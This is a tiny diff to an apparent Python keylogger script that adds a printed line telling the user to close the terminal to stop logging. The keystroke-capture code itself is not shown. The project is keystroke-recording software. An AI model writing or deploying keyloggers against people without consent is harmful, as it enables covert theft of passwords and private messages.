@@ -21,4 +21,5 @@ def start_keylogger():
         listener.join()
 if __name__ == "__main__":
     print("Keylogger started...")
+    print("Close the Terminal to Stop Logging")
     start_keylogger()
